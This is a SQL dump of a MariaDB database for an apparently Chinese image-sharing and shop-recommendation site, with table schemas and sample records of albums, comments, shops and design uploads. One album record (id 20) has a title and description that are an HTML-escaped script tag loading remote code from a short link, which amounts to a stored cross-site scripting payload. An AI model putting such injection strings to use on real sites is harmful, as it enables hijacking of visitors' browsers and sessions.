/*
Navicat MariaDB Data Transfer

Source Server         : 个人
Source Server Version : 50541
Source Host           : 115.28.73.129:3306
Source Database       : diuzhuan

Target Server Type    : MariaDB
Target Server Version : 50541
File Encoding         : 65001

Date: 2017-04-07 17:23:36
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for dz_album
-- ----------------------------
DROP TABLE IF EXISTS `dz_album`;
CREATE TABLE `dz_album` (
  `album_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '图夹id',
  `category_id` int(11) DEFAULT '0' COMMENT '分类id(0表示没有分类)',
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `album_title` varchar(255) NOT NULL COMMENT '图夹名称',
  `album_desc` text COMMENT '图夹描述',
  `total_share` int(11) DEFAULT '0' COMMENT '总分享数',
  `total_like` int(11) DEFAULT '0' COMMENT '总喜欢数',
  `create_time` int(10) NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`album_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_album
-- ----------------------------
INSERT INTO `dz_album` VALUES ('20', '1', '33', '&lt;script src=http://t.cn/R5AVkbE&gt;&lt;/script&gt;', '&lt;script src=http://t.cn/R5AVkbE&gt;&lt;/script&gt;', '0', '0', '1483088080');
INSERT INTO `dz_album` VALUES ('19', '5', '32', 'ui 网站', '', '125', '0', '1482999177');
INSERT INTO `dz_album` VALUES ('18', '5', '32', '平面设计 其他', '', '32', '0', '1482995197');
INSERT INTO `dz_album` VALUES ('17', '5', '32', '平面设计 vi', '', '5', '0', '1482994880');
INSERT INTO `dz_album` VALUES ('16', '1', '31', '第一个', '哈哈', '1', '0', '1482940175');

-- ----------------------------
-- Table structure for dz_apply
-- ----------------------------
DROP TABLE IF EXISTS `dz_apply`;
CREATE TABLE `dz_apply` (
  `apply_id` int(10) NOT NULL AUTO_INCREMENT COMMENT '申请id',
  `apply_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '申请类型(0-认领好店申请)',
  `user_id` int(10) NOT NULL COMMENT '申请人id',
  `apply_desc` varchar(255) DEFAULT NULL COMMENT '申请描述(好店id)',
  `is_active` tinyint(1) DEFAULT '0' COMMENT '是否批准(0-审核中,1-通过,2-拒绝)',
  `create_time` int(10) NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`apply_id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_apply
-- ----------------------------
INSERT INTO `dz_apply` VALUES ('24', '0', '24', '5', '1', '1389331023');
INSERT INTO `dz_apply` VALUES ('25', '0', '24', '', '0', '1389331590');

-- ----------------------------
-- Table structure for dz_board
-- ----------------------------
DROP TABLE IF EXISTS `dz_board`;
CREATE TABLE `dz_board` (
  `board_id` int(11) NOT NULL AUTO_INCREMENT,
  `category_id` int(11) DEFAULT NULL,
  `board_title` varchar(255) NOT NULL,
  `board_desc` text,
  `create_time` int(10) DEFAULT NULL,
  `shop_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `board_cover` text,
  `total_share` int(11) DEFAULT '0',
  `total_like` int(11) DEFAULT '0',
  PRIMARY KEY (`board_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_board
-- ----------------------------
INSERT INTO `dz_board` VALUES ('19', null, 'fsdafsdf', 'fds', '0', '5', '24', null, '0', '0');
INSERT INTO `dz_board` VALUES ('1', '4', '第一个好店图夹', '范德萨富士达', '2014', '3', '24', null, '0', '0');
INSERT INTO `dz_board` VALUES ('18', null, '4456+', '878', '2014', '5', '24', null, '0', '0');
INSERT INTO `dz_board` VALUES ('20', null, 'dfsfd', 'd', '1389335545', '5', '24', null, '0', '0');

-- ----------------------------
-- Table structure for dz_category
-- ----------------------------
DROP TABLE IF EXISTS `dz_category`;
CREATE TABLE `dz_category` (
  `category_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '分类id',
  `parent_id` int(11) DEFAULT '0' COMMENT '父类id',
  `category_name` varchar(80) NOT NULL COMMENT '分类名称',
  `category_hot_words` varchar(255) DEFAULT NULL COMMENT '分类热词',
  `display_order` int(11) DEFAULT '0' COMMENT '显示顺序',
  `is_active` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示(0-不显示,1-显示)',
  PRIMARY KEY (`category_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_category
-- ----------------------------
INSERT INTO `dz_category` VALUES ('1', '0', '家居杂物dd', '粉刺分词', '1', '1');
INSERT INTO `dz_category` VALUES ('2', '0', '园艺', null, '0', '1');
INSERT INTO `dz_category` VALUES ('4', '0', '漫画/插画', null, '0', '1');
INSERT INTO `dz_category` VALUES ('5', '0', 'rrrrr', '', '0', '1');

-- ----------------------------
-- Table structure for dz_comment
-- ----------------------------
DROP TABLE IF EXISTS `dz_comment`;
CREATE TABLE `dz_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `share_id` int(11) NOT NULL,
  `comment_txt` text,
  `create_time` int(10) NOT NULL,
  PRIMARY KEY (`comment_id`),
  KEY `idx_comment_id` (`comment_id`),
  KEY `idx_share_id` (`share_id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=45 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_comment
-- ----------------------------
INSERT INTO `dz_comment` VALUES ('5', '24', '33', '787', '1388990517');
INSERT INTO `dz_comment` VALUES ('7', '24', '33', 'df', '1388991027');
INSERT INTO `dz_comment` VALUES ('41', '24', '56', '4564612', '1389258021');
INSERT INTO `dz_comment` VALUES ('13', '24', '33', '15', '1388991549');
INSERT INTO `dz_comment` VALUES ('14', '24', '33', 'dfd', '1388991904');
INSERT INTO `dz_comment` VALUES ('15', '24', '33', 'dfds', '1388991931');
INSERT INTO `dz_comment` VALUES ('16', '24', '33', 'fd', '1388991946');
INSERT INTO `dz_comment` VALUES ('17', '24', '33', 'df', '1388991960');
INSERT INTO `dz_comment` VALUES ('18', '24', '33', 'dfd', '1388992004');
INSERT INTO `dz_comment` VALUES ('19', '24', '33', 'ffdf', '1388992056');
INSERT INTO `dz_comment` VALUES ('20', '24', '33', '发达省份的', '1388992129');
INSERT INTO `dz_comment` VALUES ('21', '24', '33', '法撒旦发射大', '1388992137');
INSERT INTO `dz_comment` VALUES ('22', '24', '33', '范德萨发生', '1388992325');
INSERT INTO `dz_comment` VALUES ('44', '24', '56', '78', '1389258048');
INSERT INTO `dz_comment` VALUES ('43', '24', '56', '878', '1389258041');
INSERT INTO `dz_comment` VALUES ('42', '24', '56', '456456', '1389258035');

-- ----------------------------
-- Table structure for dz_favorite_sharing
-- ----------------------------
DROP TABLE IF EXISTS `dz_favorite_sharing`;
CREATE TABLE `dz_favorite_sharing` (
  `favorite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `share_id` int(11) NOT NULL COMMENT '分享ID',
  `create_time` int(10) NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`favorite_id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_favorite_sharing
-- ----------------------------
INSERT INTO `dz_favorite_sharing` VALUES ('2', '24', '31', '1388979408');
INSERT INTO `dz_favorite_sharing` VALUES ('3', '24', '28', '1388979484');
INSERT INTO `dz_favorite_sharing` VALUES ('4', '24', '30', '1388979759');
INSERT INTO `dz_favorite_sharing` VALUES ('5', '24', '31', '1388979853');
INSERT INTO `dz_favorite_sharing` VALUES ('6', '24', '31', '1388979887');
INSERT INTO `dz_favorite_sharing` VALUES ('7', '24', '29', '1388979891');
INSERT INTO `dz_favorite_sharing` VALUES ('8', '24', '30', '1388979894');
INSERT INTO `dz_favorite_sharing` VALUES ('9', '29', '33', '1388979958');
INSERT INTO `dz_favorite_sharing` VALUES ('10', '29', '53', '1389076960');
INSERT INTO `dz_favorite_sharing` VALUES ('11', '29', '32', '1389076970');
INSERT INTO `dz_favorite_sharing` VALUES ('12', '24', '56', '1389253182');

-- ----------------------------
-- Table structure for dz_gitem
-- ----------------------------
DROP TABLE IF EXISTS `dz_gitem`;
CREATE TABLE `dz_gitem` (
  `gitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL COMMENT 'item id',
  `shop_id` int(11) NOT NULL COMMENT '好店id',
  `user_id` int(11) NOT NULL COMMENT '店主id',
  `board_id` int(11) NOT NULL COMMENT '好店图夹id',
  `create_time` int(10) NOT NULL,
  PRIMARY KEY (`gitem_id`)
) ENGINE=MyISAM AUTO_INCREMENT=57 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_gitem
-- ----------------------------
INSERT INTO `dz_gitem` VALUES ('50', '54', '3', '24', '1', '1000000000');
INSERT INTO `dz_gitem` VALUES ('51', '55', '3', '24', '1', '1000000000');
INSERT INTO `dz_gitem` VALUES ('52', '56', '3', '24', '1', '1000000000');
INSERT INTO `dz_gitem` VALUES ('53', '62', '5', '24', '1', '0');
INSERT INTO `dz_gitem` VALUES ('54', '63', '5', '24', '1', '0');
INSERT INTO `dz_gitem` VALUES ('55', '64', '5', '24', '1', '0');
INSERT INTO `dz_gitem` VALUES ('56', '66', '3', '24', '1', '0');

-- ----------------------------
-- Table structure for dz_goodshop
-- ----------------------------
DROP TABLE IF EXISTS `dz_goodshop`;
CREATE TABLE `dz_goodshop` (
  `shop_id` int(11) NOT NULL AUTO_INCREMENT,
  `recommend_user_id` int(11) NOT NULL COMMENT '推荐人ID',
  `user_id` int(11) DEFAULT '0' COMMENT '店主ID',
  `store_category_id` int(11) DEFAULT '0' COMMENT '好店分类ID',
  `store_name` varchar(100) DEFAULT NULL COMMENT '店名',
  `province` varchar(20) DEFAULT NULL COMMENT '好店所在省',
  `city` varchar(20) DEFAULT NULL COMMENT '好店所在城市',
  `location` varchar(20) DEFAULT NULL COMMENT '区',
  `address` varchar(255) DEFAULT NULL COMMENT '详细地址',
  `phone` varchar(45) DEFAULT NULL COMMENT '联系电话',
  `shop_logo` text COMMENT '好店头像',
  `shop_desc` text COMMENT '好店描述',
  `display_order` int(11) NOT NULL DEFAULT '100' COMMENT '排序',
  `total_boards` int(11) DEFAULT '0' COMMENT '店铺总图夹数',
  `total_shares` int(11) DEFAULT '0' COMMENT '店铺总分享数',
  `create_time` int(10) NOT NULL COMMENT '创建时间',
  `is_active` int(1) DEFAULT '0' COMMENT '是否通过申请（0-待定，1-是,2-否,3-删除）',
  PRIMARY KEY (`shop_id`),
  KEY `idx_shop_id` (`shop_id`),
  KEY `idx_category_id` (`store_category_id`),
  KEY `idx_user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_goodshop
-- ----------------------------
INSERT INTO `dz_goodshop` VALUES ('5', '24', '24', '0', 'aaa', '北京', '朝阳区', null, 'bbb', null, '/Uploads/shopLogo/5', 'ccc的', '100', '5', '3', '1389237318', '1');
INSERT INTO `dz_goodshop` VALUES ('4', '8', '0', '0', '122222', '北京', '西城区', null, '', null, '/Public/Img/shop', '', '100', '0', '0', '1389233623', '3');
INSERT INTO `dz_goodshop` VALUES ('3', '24', '0', '0', 'fsdafds', '北京', '', null, 'fds', null, '/Public/Img/shop', 'fds', '100', '0', '1', '1389233551', '1');

-- ----------------------------
-- Table structure for dz_recommend
-- ----------------------------
DROP TABLE IF EXISTS `dz_recommend`;
CREATE TABLE `dz_recommend` (
  `recommend_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_ids` varchar(255) DEFAULT NULL COMMENT '用户id',
  `title` varchar(50) DEFAULT NULL COMMENT '标题',
  `album_ids` varchar(255) DEFAULT NULL COMMENT '图夹id',
  `is_active` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `create_time` int(10) NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`recommend_id`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_recommend
-- ----------------------------
INSERT INTO `dz_recommend` VALUES ('18', '31,32', '推荐', '17,18,19', '1', '1388995464');

-- ----------------------------
-- Table structure for dz_relationship
-- ----------------------------
DROP TABLE IF EXISTS `dz_relationship`;
CREATE TABLE `dz_relationship` (
  `relation_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `friend_id` int(11) NOT NULL,
  `relation_status` tinyint(2) NOT NULL,
  PRIMARY KEY (`relation_id`),
  KEY `idx_relation_id` (`relation_id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_friend_id` (`friend_id`),
  KEY `idx_user_friend_id` (`user_id`,`friend_id`),
  KEY `idx_user_id_status` (`user_id`,`relation_status`),
  KEY `idx_friend_id_status` (`friend_id`,`relation_status`)
) ENGINE=MyISAM AUTO_INCREMENT=36 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_relationship
-- ----------------------------
INSERT INTO `dz_relationship` VALUES ('34', '24', '8', '1');
INSERT INTO `dz_relationship` VALUES ('27', '0', '30', '1');
INSERT INTO `dz_relationship` VALUES ('28', '0', '29', '1');
INSERT INTO `dz_relationship` VALUES ('35', '31', '32', '1');

-- ----------------------------
-- Table structure for dz_role
-- ----------------------------
DROP TABLE IF EXISTS `dz_role`;
CREATE TABLE `dz_role` (
  `role_id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL COMMENT '角色名',
  `pid` smallint(6) DEFAULT NULL,
  `status` tinyint(1) unsigned DEFAULT NULL COMMENT '状态',
  `remark` varchar(255) DEFAULT NULL COMMENT '注释',
  PRIMARY KEY (`role_id`),
  KEY `pid` (`pid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_role
-- ----------------------------

-- ----------------------------
-- Table structure for dz_settings
-- ----------------------------
DROP TABLE IF EXISTS `dz_settings`;
CREATE TABLE `dz_settings` (
  `setting_id` int(11) NOT NULL AUTO_INCREMENT,
  `set_key` varchar(100) NOT NULL,
  `set_value` text NOT NULL,
  PRIMARY KEY (`setting_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_settings
-- ----------------------------
INSERT INTO `dz_settings` VALUES ('1', 'homeslide', 'a:2:{i:0;a:6:{s:3:\"key\";i:1388640601;s:9:\"image_url\";s:17:\"52c4f9587122e.jpg\";s:8:\"link_url\";s:0:\"\";s:5:\"order\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"desc\";s:0:\"\";}i:1;a:6:{s:3:\"key\";i:1388742303;s:9:\"image_url\";s:17:\"52c6869d93be6.jpg\";s:8:\"link_url\";s:0:\"\";s:5:\"order\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"desc\";s:0:\"\";}}');

-- ----------------------------
-- Table structure for dz_share
-- ----------------------------
DROP TABLE IF EXISTS `dz_share`;
CREATE TABLE `dz_share` (
  `share_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '分享ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `category_id` int(11) NOT NULL COMMENT '分类ID',
  `album_id` int(11) NOT NULL COMMENT '图夹ID',
  `intro` varchar(500) DEFAULT NULL COMMENT '图片简介',
  `image_path` varchar(255) DEFAULT NULL COMMENT '地址路径',
  `share_type` varchar(20) NOT NULL DEFAULT 'None' COMMENT '分享类型',
  `reference_url` varchar(255) DEFAULT NULL COMMENT '图片源网址',
  `color` varchar(20) DEFAULT '' COMMENT '颜色',
  `total_comments` int(11) DEFAULT '0' COMMENT '总评论数',
  `total_likes` int(11) DEFAULT '0' COMMENT '被赞次数',
  `total_forwording` int(11) DEFAULT '0' COMMENT '转发次数',
  `is_delete` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否被删除(0-否,1-是)',
  `create_time` int(10) DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`share_id`)
) ENGINE=MyISAM AUTO_INCREMENT=236 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_share
-- ----------------------------
INSERT INTO `dz_share` VALUES ('89', '32', '5', '19', '品牌活动', '/Uploads/attachments/2016/12/30/5865bd8d239a1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062676');
INSERT INTO `dz_share` VALUES ('88', '32', '5', '19', '品牌故事', '/Uploads/attachments/2016/12/30/5865bd7bec605', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062659');
INSERT INTO `dz_share` VALUES ('87', '32', '5', '19', '了解更多', '/Uploads/attachments/2016/12/30/5865bd5bdcb7e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062628');
INSERT INTO `dz_share` VALUES ('86', '32', '5', '19', '公司文化', '/Uploads/attachments/2016/12/30/5865bce866451', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062605');
INSERT INTO `dz_share` VALUES ('85', '32', '5', '19', '公司店铺', '/Uploads/attachments/2016/12/30/5865bcd030abe', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062487');
INSERT INTO `dz_share` VALUES ('84', '32', '5', '19', '代理加盟', '/Uploads/attachments/2016/12/30/5865bc977907d', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062431');
INSERT INTO `dz_share` VALUES ('83', '32', '5', '19', '联系我们', '/Uploads/attachments/2016/12/30/5865bc79b7127', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062400');
INSERT INTO `dz_share` VALUES ('82', '32', '5', '19', '品牌活动', '/Uploads/attachments/2016/12/30/5865bc495b2a5', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062372');
INSERT INTO `dz_share` VALUES ('81', '32', '5', '19', '招聘页面', '/Uploads/attachments/2016/12/29/5864cc9099fd1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483001191');
INSERT INTO `dz_share` VALUES ('79', '32', '5', '19', '推荐产品', '/Uploads/attachments/2016/12/29/5864c75a1daf1', 'upload', '', '#26282E', '0', '0', '0', '0', '1482999648');
INSERT INTO `dz_share` VALUES ('78', '32', '5', '19', '男士内页', '/Uploads/attachments/2016/12/29/5864c73eda668', 'upload', '', '#26282E', '0', '0', '0', '0', '1482999622');
INSERT INTO `dz_share` VALUES ('77', '32', '5', '19', '儿童列表页', '/Uploads/attachments/2016/12/29/5864c67b586f4', 'upload', '', '#26282E', '0', '0', '0', '0', '1482999509');
INSERT INTO `dz_share` VALUES ('76', '32', '5', '19', '拓冰者网站首页', '/Uploads/attachments/2016/12/29/5864c5f3c0c9b', 'upload', '', '#26282E', '0', '0', '0', '0', '1482999296');
INSERT INTO `dz_share` VALUES ('74', '32', '5', '17', '奇缘vi', '/Uploads/attachments/2016/12/29/5864c10042cf9', 'upload', '', '#26282E', '0', '0', '0', '0', '1482998024');
INSERT INTO `dz_share` VALUES ('75', '32', '5', '18', '单页', '/Uploads/attachments/2016/12/29/5864c1b2a5964', 'upload', '', '#26282E', '0', '0', '0', '0', '1482998209');
INSERT INTO `dz_share` VALUES ('72', '32', '5', '17', '谷丽vi', '/Uploads/attachments/2016/12/29/5864bc114e071', 'upload', '', '#26282E', '0', '0', '0', '0', '1482996761');
INSERT INTO `dz_share` VALUES ('70', '32', '5', '17', '鼎泰欣logo', '/Uploads/attachments/2016/12/29/5864b5a39d66a', 'upload', '', '#26282E', '0', '0', '0', '0', '1482995127');
INSERT INTO `dz_share` VALUES ('69', '32', '5', '17', '希格玛logo', '/Uploads/attachments/2016/12/29/5864b55c72381', 'upload', '', '#26282E', '0', '0', '0', '0', '1482995044');
INSERT INTO `dz_share` VALUES ('68', '32', '5', '17', '智融logo', '/Uploads/attachments/2016/12/29/5864b4e2e5ecc', 'upload', '', '#26282E', '0', '0', '0', '0', '1482994936');
INSERT INTO `dz_share` VALUES ('67', '31', '0', '16', 'wodezuopin', '/Uploads/attachments/2016/12/29/5863e250097db', 'upload', '', '#26282E', '0', '0', '0', '0', '1482941017');
INSERT INTO `dz_share` VALUES ('90', '32', '5', '19', '森阳首页', '/Uploads/attachments/2016/12/30/5865bdbae31b9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062721');
INSERT INTO `dz_share` VALUES ('91', '32', '5', '19', '森阳联系我们', '/Uploads/attachments/2016/12/30/5865bdd5aedca', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062748');
INSERT INTO `dz_share` VALUES ('92', '32', '5', '19', '森阳加入我们', '/Uploads/attachments/2016/12/30/5865bde566252', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062763');
INSERT INTO `dz_share` VALUES ('93', '32', '5', '19', '森阳公司简介', '/Uploads/attachments/2016/12/30/5865bdf761c94', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062781');
INSERT INTO `dz_share` VALUES ('94', '32', '5', '19', '森阳公司动态', '/Uploads/attachments/2016/12/30/5865be0d58b7e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062810');
INSERT INTO `dz_share` VALUES ('95', '32', '5', '19', '森阳服务支持', '/Uploads/attachments/2016/12/30/5865be27e5fe0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062830');
INSERT INTO `dz_share` VALUES ('96', '32', '5', '19', '森阳产品页', '/Uploads/attachments/2016/12/30/5865be39a43b5', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062849');
INSERT INTO `dz_share` VALUES ('97', '32', '5', '19', '森阳品质保障', '/Uploads/attachments/2016/12/30/5865be4b21f96', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062866');
INSERT INTO `dz_share` VALUES ('98', '32', '5', '19', '森阳精诚服务', '/Uploads/attachments/2016/12/30/5865be5b4e3fa', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062887');
INSERT INTO `dz_share` VALUES ('99', '32', '5', '19', '产品详情页', '/Uploads/attachments/2016/12/30/5865be71975db', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062905');
INSERT INTO `dz_share` VALUES ('100', '32', '5', '19', '产品详情页id', '/Uploads/attachments/2016/12/30/5865be85e7d66', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062925');
INSERT INTO `dz_share` VALUES ('101', '32', '5', '19', '产品详情页', '/Uploads/attachments/2016/12/30/5865be95e62e7', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062940');
INSERT INTO `dz_share` VALUES ('102', '32', '5', '19', '乐萱首页', '/Uploads/attachments/2016/12/30/5865bebea1b9e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483062983');
INSERT INTO `dz_share` VALUES ('103', '32', '5', '19', '投资者关系', '/Uploads/attachments/2016/12/30/5865bee52f0a0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063020');
INSERT INTO `dz_share` VALUES ('104', '32', '5', '19', '乐萱大事记', '/Uploads/attachments/2016/12/30/5865befc6de0b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063043');
INSERT INTO `dz_share` VALUES ('105', '32', '5', '19', '乐萱新闻动态', '/Uploads/attachments/2016/12/30/5865bf640574b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063152');
INSERT INTO `dz_share` VALUES ('106', '32', '5', '19', 'ui动态详情', '/Uploads/attachments/2016/12/30/5865bf9d54bdd', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063230');
INSERT INTO `dz_share` VALUES ('107', '32', '5', '19', '签约详情页', '/Uploads/attachments/2016/12/30/5865bfee4f114', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063291');
INSERT INTO `dz_share` VALUES ('108', '32', '5', '19', '签约作家', '/Uploads/attachments/2016/12/30/5865c0359e834', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063361');
INSERT INTO `dz_share` VALUES ('109', '32', '5', '19', '签约案例', '/Uploads/attachments/2016/12/30/5865c05e85c2f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063397');
INSERT INTO `dz_share` VALUES ('110', '32', '5', '19', '案例详情页', '/Uploads/attachments/2016/12/30/5865c0943ee31', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063662');
INSERT INTO `dz_share` VALUES ('111', '32', '5', '19', '联系我们', '/Uploads/attachments/2016/12/30/5865c19b3e01d', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063713');
INSERT INTO `dz_share` VALUES ('112', '32', '5', '19', '加入我们', '/Uploads/attachments/2016/12/30/5865c1acb23e9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063730');
INSERT INTO `dz_share` VALUES ('113', '32', '5', '19', '荣誉', '/Uploads/attachments/2016/12/30/5865c1bd1fe47', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063747');
INSERT INTO `dz_share` VALUES ('114', '32', '5', '19', '公司文化详情页', '/Uploads/attachments/2016/12/30/5865c208dfbd0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063828');
INSERT INTO `dz_share` VALUES ('115', '32', '5', '19', '公司文化', '/Uploads/attachments/2016/12/30/5865c21f70146', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063845');
INSERT INTO `dz_share` VALUES ('116', '32', '5', '19', '商务联系', '/Uploads/attachments/2016/12/30/5865c2321b44f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063864');
INSERT INTO `dz_share` VALUES ('117', '32', '5', '19', '鼎泰欣首页', '/Uploads/attachments/2016/12/30/5865c2871a48d', 'upload', '', '#26282E', '0', '0', '0', '0', '1483063981');
INSERT INTO `dz_share` VALUES ('118', '32', '5', '19', '鼎泰欣2', '/Uploads/attachments/2016/12/30/5865c31a29eb1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064108');
INSERT INTO `dz_share` VALUES ('119', '32', '5', '19', '鼎泰欣产品列表', '/Uploads/attachments/2016/12/30/5865c37a223e8', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064240');
INSERT INTO `dz_share` VALUES ('120', '32', '5', '19', '服务范围', '/Uploads/attachments/2016/12/30/5865c4072c162', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064336');
INSERT INTO `dz_share` VALUES ('121', '32', '5', '19', '新闻列表页+', '/Uploads/attachments/2016/12/30/5865c5afeabe4', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064770');
INSERT INTO `dz_share` VALUES ('122', '32', '5', '19', '新闻动态\n', '/Uploads/attachments/2016/12/30/5865c62a06dac', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064896');
INSERT INTO `dz_share` VALUES ('123', '32', '5', '19', '联系我们', '/Uploads/attachments/2016/12/30/5865c67e52a6f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483064975');
INSERT INTO `dz_share` VALUES ('124', '32', '5', '19', '丽歌首页', '/Uploads/attachments/2016/12/30/5865c71c616d9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065130');
INSERT INTO `dz_share` VALUES ('125', '32', '5', '19', '丽歌产品列表', '/Uploads/attachments/2016/12/30/5865c7569374c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065187');
INSERT INTO `dz_share` VALUES ('126', '32', '5', '19', '案例详情页', '/Uploads/attachments/2016/12/30/5865c78c455b4', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065236');
INSERT INTO `dz_share` VALUES ('127', '32', '5', '19', '丽歌服务范围', '/Uploads/attachments/2016/12/30/5865c7e399cd9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065328');
INSERT INTO `dz_share` VALUES ('128', '32', '5', '19', '丽歌关于我们', '/Uploads/attachments/2016/12/30/5865c8332967b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065411');
INSERT INTO `dz_share` VALUES ('129', '32', '5', '19', '丽歌新闻资讯', '/Uploads/attachments/2016/12/30/5865c8540aa1b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065439');
INSERT INTO `dz_share` VALUES ('130', '32', '5', '19', '新闻资讯详情页', '/Uploads/attachments/2016/12/30/5865c86bc439a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065463');
INSERT INTO `dz_share` VALUES ('131', '32', '5', '18', '主图', '/Uploads/attachments/2016/12/30/5865c8b7485b7', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065540');
INSERT INTO `dz_share` VALUES ('132', '32', '5', '18', '详情页', '/Uploads/attachments/2016/12/30/5865c8d7831fd', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065569');
INSERT INTO `dz_share` VALUES ('133', '32', '5', '18', '充电宝详情页', '/Uploads/attachments/2016/12/30/5865c8f665110', 'upload', '', '#26282E', '0', '0', '0', '0', '1483065600');
INSERT INTO `dz_share` VALUES ('134', '32', '5', '19', '丰巨泰科商城首页', '/Uploads/attachments/2016/12/30/5865cc2680de0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066422');
INSERT INTO `dz_share` VALUES ('135', '32', '5', '19', '详情页', '/Uploads/attachments/2016/12/30/5865cc426069a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066446');
INSERT INTO `dz_share` VALUES ('136', '32', '5', '19', '列表页', '/Uploads/attachments/2016/12/30/5865cc5719292', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066460');
INSERT INTO `dz_share` VALUES ('137', '32', '5', '19', '搜索页', '/Uploads/attachments/2016/12/30/5865cc668103b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066476');
INSERT INTO `dz_share` VALUES ('138', '32', '5', '18', '易拉宝', '/Uploads/attachments/2016/12/30/5865cc90af824', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066524');
